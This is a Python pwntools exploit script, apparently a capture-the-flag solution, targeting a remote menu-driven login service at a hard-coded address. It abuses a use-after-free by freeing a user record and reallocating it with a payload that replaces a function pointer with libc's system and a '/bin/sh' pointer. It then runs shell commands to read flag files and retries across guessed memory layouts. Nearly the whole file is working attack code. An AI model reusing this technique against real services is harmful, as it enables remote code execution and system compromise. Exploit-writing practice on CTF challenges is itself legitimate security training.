from pwn import *
import argparse
import struct
import sys
import time
from datetime import datetime


HOST = "120.27.146.76"
PORT = 26473

SYSTEM_OFF = 0x453A0
BINSH_OFF = 0x18CE57
PUTS_PLT_OFF = 0x7B0
PROBE_STR_OFF = 0x10F4
PROBE_STR = b"Input the user id:"
SHELL_CMD = (
    b"cat flag* 2>/dev/null; "
    b"cat /flag 2>/dev/null; "
    b"cat /home/*/flag* 2>/dev/null; "
    b"echo END; exit"
)

PROFILES = [
    {
        "name": "normal_exec_oldld",
        "pie": 0x555555400000,
        "libc": 0x7FFFF7800000,
    },
    {
        "name": "direct_ld",
        "pie": 0x7FFFF7800000,
        "libc": 0x7FFFF7400000,
    },
    {
        "name": "ubuntu16_setarch_guess",
        "pie": 0x555555554000,
        "libc": 0x7FFFF7A0D000,
    },
]


def log(msg):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{now}] {msg}", flush=True)


def recv_menu(io):
    return io.recvuntil(b"Your choice:", timeout=3)


def menu(io, choice):
    recv_menu(io)
    io.sendline(str(choice).encode())


def register(io, idx, size, data=b""):
    menu(io, 2)
    io.sendlineafter(b"Input the user id:", str(idx).encode(), timeout=3)
    io.sendlineafter(b"Input the password length:", str(size).encode(), timeout=3)
    io.recvuntil(b"Input password:\n", timeout=3)
    io.send(data)
    io.recvuntil(b"success!", timeout=3)


def delete(io, idx):
    menu(io, 3)
    io.sendlineafter(b"Input the user id:", str(idx).encode(), timeout=3)
    io.recvuntil(b"success!", timeout=3)


def login(io, idx, size, data):
    menu(io, 1)
    io.sendlineafter(b"Input the user id:", str(idx).encode(), timeout=3)
    io.sendlineafter(b"Input the passwords length:", str(size).encode(), timeout=3)
    io.recvuntil(b"Input the password:\n", timeout=3)
    io.send(data)


def connect():
    io = remote(HOST, PORT, timeout=3)
    banner = recv_menu(io)
    io.unrecv(banner)
    return io, banner


def run_once(profile, cmd, probe=False):
    io, banner = connect()
    try:
        if probe:
            pass_ptr = profile["pie"] + PROBE_STR_OFF
            func = profile["pie"] + PUTS_PLT_OFF
        else:
            pass_ptr = profile["libc"] + BINSH_OFF
            func = profile["libc"] + SYSTEM_OFF
        payload = struct.pack("<QQ", pass_ptr, func)

        register(io, 0, 24, b"A" * 24)
        delete(io, 0)
        register(io, 1, 16, payload)
        login(io, 0, len(cmd), cmd)
        if not probe:
            time.sleep(0.2)
            io.sendline(SHELL_CMD)
        return banner, io.recvrepeat(3)
    finally:
        io.close()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--probe", action="store_true", help="use puts@plt probe payload")
    parser.add_argument("--watch", action="store_true", help="retry until an attempt returns without EOF")
    parser.add_argument("--interval", type=float, default=2.0, help="seconds between retry rounds")
    parser.add_argument("--max-rounds", type=int, default=None, help="optional retry cap for watch mode")
    return parser.parse_args()


def build_cmd(probe):
    if probe:
        cmd = PROBE_STR
    else:
        cmd = b"/bin/sh"
    return cmd


def is_useful(out, probe):
    if not out:
        return False
    if probe:
        return PROBE_STR in out
    markers = (b"END", b"flag", b"ctf{", b"FLAG", b"uid=")
    return any(marker in out for marker in markers)


def attempt_profiles(cmd, probe=False):
    for profile in PROFILES:
        log(f"trying {profile['name']}")
        try:
            banner, out = run_once(profile, cmd, probe=probe)
            log(f"banner ok: {banner!r}")
            print(repr(out), flush=True)
            if out:
                print(out.decode("latin1", "ignore"), flush=True)
            if is_useful(out, probe):
                log("useful output found")
                return True
            log("no useful output from this profile")
        except EOFError:
            log("EOF")
        except Exception as exc:
            log(f"{type(exc).__name__}: {exc}")
    return False


def main():
    context.log_level = "error"
    args = parse_args()
    cmd = build_cmd(args.probe)

    if not args.watch:
        attempt_profiles(cmd, probe=args.probe)
        return

    round_no = 0
    while args.max_rounds is None or round_no < args.max_rounds:
        round_no += 1
        log(f"watch round {round_no}")
        if attempt_profiles(cmd, probe=args.probe):
            log("stopped: got a non-EOF attempt")
            return
        log(f"sleeping {args.interval:.1f}s before retry")
        time.sleep(args.interval)

    log("stopped: reached max rounds without a non-EOF attempt")


if __name__ == "__main__":
    main()
